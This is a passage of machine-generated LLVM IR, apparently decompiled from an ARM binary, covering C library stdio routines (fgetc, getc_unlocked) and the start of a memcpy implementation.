  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 13, 14, 15, 5, 16, 17, 6, 18, 19, 20, 7, 21, 22, 8, 23, 24, 9, 10, 11, 12, 25, 26, 27, 28, 30, 29, 31, 32 }
  uselistorder i32* %r6.global-to-local, { 3, 2, 1, 4, 5, 6, 7, 8, 0, 9, 10, 13, 14, 15, 11, 16, 17, 12, 18, 21, 19, 20, 22 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 27, 29, 43, 30, 34, 31, 32, 33, 35, 28, 36, 37, 38, 39, 40, 41, 42, 64, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 2, 65, 66, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 15, 19, 20, 16, 17, 21, 22, 23, 26, 24, 25, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 12, 15, 16, 13, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 6, 7, 1, 8, 9, 34, 37, 36, 35, 10, 11, 33, 12, 13, 3, 15, 14, 38, 16, 17, 32, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 6, 7, 2, 3, 4, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 61, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 60, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 112, { 2, 11, 0, 12, 3, 1, 13, 4, 6, 5, 7, 8, 9, 10 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmpge, { 1, 0 }
  uselistorder i32 1104006501, { 4, 1, 2, 0, 3 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34216), { 0, 2, 1 }
  uselistorder i32 1100470148, { 1, 2, 0, 3 }
  uselistorder i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34240), { 2, 1, 0 }
  uselistorder i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), { 0, 3, 4, 5, 6, 2, 1, 9, 10, 11, 8, 12, 38, 39, 16, 17, 18, 19, 20, 15, 21, 14, 22, 25, 24, 23, 27, 26, 28, 35, 32, 31, 30, 29, 34, 33, 13, 37, 36, 40, 41, 42, 43, 44, 51, 47, 48, 50, 46, 7, 49, 45 }
  uselistorder i32 (i32, i32, i32, i32)* @__aeabi_dcmplt, { 3, 2, 1, 0 }
  uselistorder double 0.000000e+00, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__aeabi_dcmpeq, { 2, 1, 0 }
  uselistorder i8 32, { 1, 3, 4, 5, 2, 6, 0, 7 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 0, 1, 2, 6, 5, 4, 3, 8, 7, 9 }
  uselistorder label %dec_label_pc_168a4, { 1, 0 }
  uselistorder label %dec_label_pc_1685c, { 2, 0, 1 }
  uselistorder label %bb254, { 1, 0 }
  uselistorder label %dec_label_pc_167bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16734, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16704, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_166dc, { 1, 0 }
  uselistorder label %dec_label_pc_166b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1668c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1665c, { 2, 1, 0 }
  uselistorder label %.thread35, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165a4, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16594, { 1, 0 }
  uselistorder label %bb236, { 1, 0 }
  uselistorder label %bb234, { 1, 0 }
  uselistorder label %bb232, { 1, 0 }
  uselistorder label %.thread145, { 1, 0 }
  uselistorder label %._crit_edge93, { 1, 0 }
  uselistorder label %bb228, { 1, 0 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %.preheader, { 3, 1, 0, 2 }
  uselistorder label %bb223, { 1, 0 }
  uselistorder label %dec_label_pc_164bc, { 2, 1, 0 }
  uselistorder label %bb220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_163c8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_16378, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16370, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %dec_label_pc_16254, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_16170, { 1, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %bb201, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_168dc = load i32, i32* @r4, align 4
  store i32 %v3_168dc, i32* %stack_var_-16, align 4
  %v6_168dc = load i32, i32* @r5, align 4
  %v12_168dc = load i32, i32* @lr, align 4
  %v1_168e0 = add i32 %arg1, 52
  %v2_168e0 = inttoptr i32 %v1_168e0 to i32*
  %v3_168e0 = load i32, i32* %v2_168e0, align 4
  %v2_168e8 = icmp eq i32 %v3_168e0, 0
  store i32 %arg1, i32* @r5, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %r6.global-to-local, align 4
  br i1 %v2_168e8, label %dec_label_pc_16920, label %dec_label_pc_168fc

dec_label_pc_168fc:                               ; preds = %entry
  %v1_168fc = add i32 %arg1, 16
  %v2_168fc = inttoptr i32 %v1_168fc to i32*
  %v3_168fc = load i32, i32* %v2_168fc, align 4
  %v1_16900 = add i32 %arg1, 24
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  %v3_16904 = icmp ult i32 %v3_168fc, %v3_16900
  br i1 %v3_16904, label %.thread, label %dec_label_pc_16914

.thread:                                          ; preds = %dec_label_pc_168fc
  %v2_16908 = inttoptr i32 %v3_168fc to i8*
  %v3_16908 = load i8, i8* %v2_16908, align 1
  %v4_16908 = zext i8 %v3_16908 to i32
  store i32 %v4_16908, i32* %r4.global-to-local, align 4
  %v6_16908 = add i32 %v3_168fc, 1
  store i32 %v6_16908, i32* %v2_168fc, align 4
  br label %dec_label_pc_16994

dec_label_pc_16914:                               ; preds = %dec_label_pc_168fc
  %v1_16914 = inttoptr i32 %arg1 to i16*
  %v2_16914 = call i32 @getc_unlocked(i16* %v1_16914)
  store i32 %v2_16914, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16994

dec_label_pc_16920:                               ; preds = %entry
  %v1_16924 = add i32 %arg1, 56
  store i32 %v1_16924, i32* @r4, align 4
  %v4_16938 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16938)
  %v0_1694c = load i32, i32* %r6.global-to-local, align 4
  %v2_1694c = add i32 %v0_1694c, 16
  %v3_1694c = inttoptr i32 %v2_1694c to i32*
  %v4_1694c = load i32, i32* %v3_1694c, align 4
  store i32 92504, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1694c)
  %v0_16958 = load i32, i32* @r5, align 4
  %v1_16958 = add i32 %v0_16958, 16
  %v2_16958 = inttoptr i32 %v1_16958 to i32*
  %v3_16958 = load i32, i32* %v2_16958, align 4
  %v1_1695c = add i32 %v0_16958, 24
  %v2_1695c = inttoptr i32 %v1_1695c to i32*
  %v3_1695c = load i32, i32* %v2_1695c, align 4
  %v3_16960 = icmp ult i32 %v3_16958, %v3_1695c
  br i1 %v3_16960, label %.thread2, label %dec_label_pc_16970

.thread2:                                         ; preds = %dec_label_pc_16920
  %v2_16964 = inttoptr i32 %v3_16958 to i8*
  %v3_16964 = load i8, i8* %v2_16964, align 1
  %v4_16964 = zext i8 %v3_16964 to i32
  store i32 %v4_16964, i32* %r4.global-to-local, align 4
  %v6_16964 = add i32 %v3_16958, 1
  store i32 %v6_16964, i32* %v2_16958, align 4
  br label %dec_label_pc_1697c

dec_label_pc_16970:                               ; preds = %dec_label_pc_16920
  %v1_16974 = inttoptr i32 %v0_16958 to i16*
  %v2_16974 = call i32 @getc_unlocked(i16* %v1_16974)
  store i32 %v2_16974, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1697c

dec_label_pc_1697c:                               ; preds = %.thread2, %dec_label_pc_16970
  %v0_16988 = load i32, i32* %r6.global-to-local, align 4
  %v2_16988 = add i32 %v0_16988, 24
  %v3_16988 = inttoptr i32 %v2_16988 to i32*
  %v4_16988 = load i32, i32* %v3_16988, align 4
  store i32 %v4_16988, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_16988)
  br label %dec_label_pc_16994

dec_label_pc_16994:                               ; preds = %.thread, %dec_label_pc_16914, %dec_label_pc_1697c
  %v0_16994 = load i32, i32* %r4.global-to-local, align 4
  %v2_1699c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1699c, i32* @r4, align 4
  store i32 %v6_168dc, i32* @r5, align 4
  store i32 %v12_168dc, i32* @lr, align 4
  ret i32 %v0_16994

; uselistorder directives
  uselistorder i32 %v3_16958, { 1, 0, 2 }
  uselistorder i32 %v3_168fc, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 2, 5, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_16994, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1697c, { 1, 0 }
}

define i32 @function_169a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_169a8:
  %v0_169a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_169a8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_169a8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_169a8, %bb
  %v10_169b4 = phi i32 [ %arg1, %dec_label_pc_169a8 ], [ 0, %bb ]
  ret i32 %v10_169b4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_169b8 = load i32, i32* @r4, align 4
  store i32 %v3_169b8, i32* %stack_var_-12, align 4
  %v6_169b8 = load i32, i32* @r5, align 4
  %v9_169b8 = load i32, i32* @lr, align 4
  %v0_169bc = load i32, i32* @r0, align 4
  %v1_169bc = add i32 %v0_169bc, 16
  %v2_169bc = inttoptr i32 %v1_169bc to i32*
  %v3_169bc = load i32, i32* %v2_169bc, align 4
  store i32 %v3_169bc, i32* %r2.global-to-local, align 4
  %v1_169c0 = add i32 %v0_169bc, 24
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  %v3_169c4 = icmp ult i32 %v3_169bc, %v3_169c0
  store i32 %v0_169bc, i32* @r4, align 4
  br i1 %v3_169c4, label %bb, label %dec_label_pc_169e4

bb:                                               ; preds = %entry
  %v2_169d0 = inttoptr i32 %v3_169bc to i8*
  %v3_169d0 = load i8, i8* %v2_169d0, align 1
  %v4_169d0 = zext i8 %v3_169d0 to i32
  store i32 %v4_169d0, i32* %r0.global-to-local, align 4
  %v6_169d0 = add i32 %v3_169bc, 1
  store i32 %v6_169d0, i32* %r2.global-to-local, align 4
  store i32 %v6_169d0, i32* %v2_169bc, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_169e4:                               ; preds = %entry
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r5, align 4
  %v1_169e4 = inttoptr i32 %v0_169bc to i16*
  %v2_169e4 = load i16, i16* %v1_169e4, align 2
  %v3_169e4 = zext i16 %v2_169e4 to i32
  %v1_169e8 = and i32 %v3_169e4, 131
  %tmp25 = icmp ugt i32 %v1_169e8, 128
  br i1 %tmp25, label %dec_label_pc_16a04, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169e4
  store i32 128, i32* @r1, align 4
  %v0_169f8 = call i32 @__stdio_trans2r_o()
  store i32 %v0_169f8, i32* %r0.global-to-local, align 4
  %v2_169fc = icmp eq i32 %v0_169f8, 0
  br i1 %v2_169fc, label %dec_label_pc_169f4.dec_label_pc_16a04_crit_edge, label %dec_label_pc_16acc

dec_label_pc_169f4.dec_label_pc_16a04_crit_edge:  ; preds = %dec_label_pc_169f4
  %v0_16a04.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169f4.dec_label_pc_16a04_crit_edge, %dec_label_pc_169e4
  %v2_16a44 = phi i32 [ %v0_16a04.pre, %dec_label_pc_169f4.dec_label_pc_16a04_crit_edge ], [ %v0_169bc, %dec_label_pc_169e4 ]
  %v1_16a04 = inttoptr i32 %v2_16a44 to i16*
  %v2_16a04 = load i16, i16* %v1_16a04, align 2
  %v3_16a04 = zext i16 %v2_16a04 to i32
  store i32 %v3_16a04, i32* %r2.global-to-local, align 4
  %v1_16a08 = and i32 %v3_16a04, 2
  %v2_16a08 = icmp eq i32 %v1_16a08, 0
  br i1 %v2_16a08, label %dec_label_pc_16a34, label %dec_label_pc_16a10

dec_label_pc_16a10:                               ; preds = %dec_label_pc_16a04
  %tmp26 = urem i16 %v2_16a04, 2
  %v1_16a10 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_16a10
  %v4_16a14 = and i32 %tmp22, 4
  %v5_16a14 = add i32 %v4_16a14, %v2_16a44
  %v1_16a18 = add i32 %v5_16a14, 36
  %v2_16a18 = inttoptr i32 %v1_16a18 to i8*
  %v3_16a18 = load i8, i8* %v2_16a18, align 1
  %v4_16a18 = zext i8 %v3_16a18 to i32
  %v1_16a1c = add nsw i32 %v3_16a04, -1
  store i32 %v1_16a1c, i32* %r2.global-to-local, align 4
  store i32 %v4_16a18, i32* %r0.global-to-local, align 4
  %v2_16a28 = add i32 %v2_16a44, 40
  %v3_16a28 = inttoptr i32 %v2_16a28 to i32*
  store i32 0, i32* %v3_16a28, align 4
  %v0_16a2c = load i32, i32* %r2.global-to-local, align 4
  %v1_16a2c = trunc i32 %v0_16a2c to i16
  %v2_16a2c = load i32, i32* @r4, align 4
  %v3_16a2c = inttoptr i32 %v2_16a2c to i16*
  store i16 %v1_16a2c, i16* %v3_16a2c, align 2
  br label %dec_label_pc_16ad0

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a04
  %v1_16a34 = add i32 %v2_16a44, 16
  %v1_16a38 = inttoptr i32 %v1_16a34 to i32*
  %v2_16a38 = load i32, i32* %v1_16a38, align 4
  %v3_16a38 = add i32 %v2_16a44, 20
  %v4_16a38 = inttoptr i32 %v3_16a38 to i32*
  %v5_16a38 = load i32, i32* %v4_16a38, align 4
  %v9_16a3c = icmp eq i32 %v5_16a38, %v2_16a38
  br i1 %v9_16a3c, label %dec_label_pc_16a4c, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a34
  %v2_16a40 = inttoptr i32 %v2_16a38 to i8*
  %v3_16a40 = load i8, i8* %v2_16a40, align 1
  %v4_16a40 = zext i8 %v3_16a40 to i32
  store i32 %v4_16a40, i32* %r0.global-to-local, align 4
  %v6_16a40 = add i32 %v2_16a38, 1
  store i32 %v6_16a40, i32* %v1_16a38, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16a4c:                               ; preds = %dec_label_pc_16a34
  %v1_16a4c = add i32 %v2_16a44, 4
  %v2_16a4c = inttoptr i32 %v1_16a4c to i32*
  %v3_16a4c = load i32, i32* %v2_16a4c, align 4
  %v7_16a50 = icmp eq i32 %v3_16a4c, -2
  br i1 %v7_16a50, label %.thread7, label %dec_label_pc_16a64

.thread7:                                         ; preds = %dec_label_pc_16a4c
  %v2_16a54 = or i16 %v2_16a04, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16a54, i16* %v1_16a04, align 2
  br label %dec_label_pc_16ad0

dec_label_pc_16a64:                               ; preds = %dec_label_pc_16a4c
  %v1_16a64 = and i32 %v3_16a04, 768
  %v2_16a64 = icmp eq i32 %v1_16a64, 0
  br i1 %v2_16a64, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16a64
  %v1_16a6c = load i32, i32* @r5, align 4
  %v3_16a6c = add i32 %v1_16a6c, 48
  %v4_16a6c = inttoptr i32 %v3_16a6c to i32*
  %v5_16a6c = load i32, i32* %v4_16a6c, align 4
  store i32 %v5_16a6c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16a64, %bb23
  %v1_16a70 = xor i1 %v2_16a64, true
  call void @__pseudo_cond_branch(i1 %v1_16a70, i32 ptrtoint (i32* @global_var_11604.308 to i32))
  %v0_16a74 = load i32, i32* @r4, align 4
  %v1_16a74 = add i32 %v0_16a74, 8
  store i32 %v1_16a74, i32* %r2.global-to-local, align 4
  %v1_16a78 = inttoptr i32 %v1_16a74 to i32*
  %v2_16a78 = load i32, i32* %v1_16a78, align 4
  store i32 %v2_16a78, i32* %r2.global-to-local, align 4
  %v3_16a78 = add i32 %v0_16a74, 12
  %v4_16a78 = inttoptr i32 %v3_16a78 to i32*
  %v5_16a78 = load i32, i32* %v4_16a78, align 4
  %v9_16a7c = icmp eq i32 %v5_16a78, %v2_16a78
  br i1 %v9_16a7c, label %dec_label_pc_16ab0, label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %.thread9
  %v2_16a84 = add i32 %v0_16a74, 24
  %v3_16a84 = inttoptr i32 %v2_16a84 to i32*
  store i32 %v2_16a78, i32* %v3_16a84, align 4
  %v0_16a88 = load i32, i32* @r4, align 4
  store i32 %v0_16a88, i32* %r0.global-to-local, align 4
  %v2_16a8c = call i32 @__stdio_rfill(i32 %v0_16a88)
  store i32 %v2_16a8c, i32* %r0.global-to-local, align 4
  %v2_16a90 = icmp eq i32 %v2_16a8c, 0
  br i1 %v2_16a90, label %dec_label_pc_16acc, label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a84
  %v0_16a98 = load i32, i32* @r4, align 4
  %v1_16a98 = add i32 %v0_16a98, 20
  %v2_16a98 = inttoptr i32 %v1_16a98 to i32*
  %v3_16a98 = load i32, i32* %v2_16a98, align 4
  %v2_16a9c = add i32 %v0_16a98, 24
  %v3_16a9c = inttoptr i32 %v2_16a9c to i32*
  store i32 %v3_16a98, i32* %v3_16a9c, align 4
  %v0_16aa0 = load i32, i32* @r4, align 4
  %v1_16aa0 = add i32 %v0_16aa0, 16
  %v2_16aa0 = inttoptr i32 %v1_16aa0 to i32*
  %v3_16aa0 = load i32, i32* %v2_16aa0, align 4
  %v1_16aa4 = inttoptr i32 %v3_16aa0 to i8*
  %v2_16aa4 = load i8, i8* %v1_16aa4, align 1
  %v3_16aa4 = zext i8 %v2_16aa4 to i32
  store i32 %v3_16aa4, i32* %r0.global-to-local, align 4
  %v5_16aa4 = add i32 %v3_16aa0, 1
  store i32 %v5_16aa4, i32* %v2_16aa0, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16ab0:                               ; preds = %.thread9
  %v1_16ab0 = inttoptr i32 %v0_16a74 to i16*
  store i32 %v0_16a74, i32* %r0.global-to-local, align 4
  %v2_16ab4 = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16abc = call i32 @__stdio_READ(i16* %v1_16ab0, i32 %v2_16ab4, i32 1)
  store i32 %v5_16abc, i32* %r0.global-to-local, align 4
  %v2_16ac0 = icmp eq i32 %v5_16abc, 0
  br i1 %v2_16ac0, label %dec_label_pc_16acc, label %bb24

bb24:                                             ; preds = %dec_label_pc_16ab0
  %v4_16ac4 = load i8, i8* %stack_var_-17, align 1
  %v5_16ac4 = sext i8 %v4_16ac4 to i32
  store i32 %v5_16ac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16acc:                               ; preds = %dec_label_pc_16ab0, %dec_label_pc_169f4, %dec_label_pc_16a84
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16a98, %dec_label_pc_16a10, %dec_label_pc_16acc
  %v2_16ad4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ad4, i32* @r4, align 4
  store i32 %v6_169b8, i32* @r5, align 4
  store i32 %v9_169b8, i32* @lr, align 4
  %v1_16ad8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16ad8

; uselistorder directives
  uselistorder i32 %v2_16a38, { 1, 0, 2 }
  uselistorder i32 %v2_16a44, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_169bc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_16ad0, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16acc, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16af0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16af0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16af0 = sub i32 %v0_16af0, %v1_16af0
  %v3_16af0 = icmp ult i32 %v0_16af0, %v1_16af0
  %v4_16af0 = xor i32 %v1_16af0, %v0_16af0
  %v5_16af0 = xor i32 %v2_16af0, %v0_16af0
  %v6_16af0 = and i32 %v5_16af0, %v4_16af0
  %v7_16af0 = icmp slt i32 %v6_16af0, 0
  store i1 %v7_16af0, i1* %cpsr_v.global-to-local, align 1
  %v8_16af0 = icmp slt i32 %v2_16af0, 0
  store i1 %v8_16af0, i1* %cpsr_n.global-to-local, align 1
  %v9_16af0 = icmp eq i32 %v0_16af0, %v1_16af0
  store i1 %v9_16af0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16af0, label %dec_label_pc_16d44, label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %entry
  br i1 %v9_16af0, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_16af8
  %merge = phi i32 [ %v0_16af0, %dec_label_pc_16af8 ], [ %v2_16dd8, %bb150 ], [ %v11_16df4, %bb153 ], [ %v7_16df4, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16af8
  %v5_16afc = inttoptr i32 %v1_16af0 to i8*
  store i8* %v5_16afc, i8** %stack_var_-8, align 4
  %v8_16afc = load i32, i32* @lr, align 4
  %v0_16b00 = load i32, i32* @r2, align 4
  %v2_16b00 = add i32 %v0_16b00, -4
  store i32 %v2_16b00, i32* %r2.global-to-local, align 4
  %v4_16b00 = sub i32 3, %v0_16b00
  %v5_16b00 = and i32 %v4_16b00, %v0_16b00
  %v6_16b00 = icmp slt i32 %v5_16b00, 0
  store i1 %v6_16b00, i1* %cpsr_v.global-to-local, align 1
  %v7_16b00 = icmp slt i32 %v2_16b00, 0
  store i1 %v7_16b00, i1* %cpsr_n.global-to-local, align 1
  %v8_16b00 = icmp eq i32 %v0_16b00, 4
  store i1 %v8_16b00, i1* %cpsr_z.global-to-local, align 1
  %v5_16b04 = icmp slt i32 %v0_16b00, 4
  br i1 %v5_16b04, label %bb140, label %dec_label_pc_16b08

dec_label_pc_16b08:                               ; preds = %bb
  %v1_16b08 = urem i32 %v1_16af0, 4
  store i32 %v1_16b08, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b08 = icmp eq i32 %v1_16b08, 0
  store i1 %v2_16b08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b08, label %dec_label_pc_16b10, label %dec_label_pc_16bbc

dec_label_pc_16b10:                               ; preds = %dec_label_pc_16b08
  %v1_16b10 = urem i32 %v0_16af0, 4
  store i32 %v1_16b10, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b10 = icmp eq i32 %v1_16b10, 0
  store i1 %v2_16b10, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16af0 to i2
  br i1 %v2_16b10, label %dec_label_pc_16b18, label %dec_label_pc_16bec

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16b10, %dec_label_pc_16be4
  %v0_16b3093 = phi i32 [ %v1_16af0, %dec_label_pc_16b10 ], [ %v0_16d0c76, %dec_label_pc_16be4 ]
  %v0_16b2c92 = phi i32 [ %v0_16af0, %dec_label_pc_16b10 ], [ %v0_16be4, %dec_label_pc_16be4 ]
  %v0_16b18 = phi i32 [ %v2_16b00, %dec_label_pc_16b10 ], [ %v2_16bdc, %dec_label_pc_16be4 ]
  %v1_16b18 = add i32 %v0_16b18, -8
  store i32 %v1_16b18, i32* %r2.global-to-local, align 4
  %v3_16b18 = sub i32 7, %v0_16b18
  %v4_16b18 = and i32 %v3_16b18, %v0_16b18
  %v5_16b18 = icmp slt i32 %v4_16b18, 0
  store i1 %v5_16b18, i1* %cpsr_v.global-to-local, align 1
  %v6_16b18 = icmp slt i32 %v1_16b18, 0
  store i1 %v6_16b18, i1* %cpsr_n.global-to-local, align 1
  %v7_16b18 = icmp eq i32 %v0_16b18, 8
  store i1 %v7_16b18, i1* %cpsr_z.global-to-local, align 1
  %v2_16b1c = xor i1 %v6_16b18, %v5_16b18
  br i1 %v2_16b1c, label %dec_label_pc_16b6c, label %dec_label_pc_16b20

dec_label_pc_16b20:                               ; preds = %dec_label_pc_16b18
  %v1_16b20 = add i32 %v0_16b18, -28
  store i32 %v1_16b20, i32* %r2.global-to-local, align 4
  %v3_16b20 = sub i32 27, %v0_16b18
  %v4_16b20 = and i32 %v3_16b20, %v1_16b18
  %v5_16b20 = icmp slt i32 %v4_16b20, 0
  store i1 %v5_16b20, i1* %cpsr_v.global-to-local, align 1
  %v6_16b20 = icmp slt i32 %v1_16b20, 0
  store i1 %v6_16b20, i1* %cpsr_n.global-to-local, align 1
  %v7_16b20 = icmp eq i32 %v1_16b18, 20
  store i1 %v7_16b20, i1* %cpsr_z.global-to-local, align 1
  %v2_16b24 = xor i1 %v6_16b20, %v5_16b20
  br i1 %v2_16b24, label %dec_label_pc_16b58, label %dec_label_pc_16b28

dec_label_pc_16b28:                               ; preds = %dec_label_pc_16b20
  %v0_16b28 = load i32, i32* @r4, align 4
  store i32 %v0_16b28, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16b2c.dec_label_pc_16b2c_crit_edge, %dec_label_pc_16b28
  %v0_16b30 = phi i32 [ %v12_16b38, %dec_label_pc_16b2c.dec_label_pc_16b2c_crit_edge ], [ %v0_16b3093, %dec_label_pc_16b28 ]
  %v0_16b2c = phi i32 [ %v0_16b2c.pre, %dec_label_pc_16b2c.dec_label_pc_16b2c_crit_edge ], [ %v0_16b2c92, %dec_label_pc_16b28 ]
  %v1_16b2c = inttoptr i32 %v0_16b2c to i32*
  %v2_16b2c = load i32, i32* %v1_16b2c, align 4
  %v3_16b2c = add i32 %v0_16b2c, 4
  %v4_16b2c = inttoptr i32 %v3_16b2c to i32*
  %v5_16b2c = load i32, i32* %v4_16b2c, align 4
  store i32 %v5_16b2c, i32* %r4.global-to-local, align 4
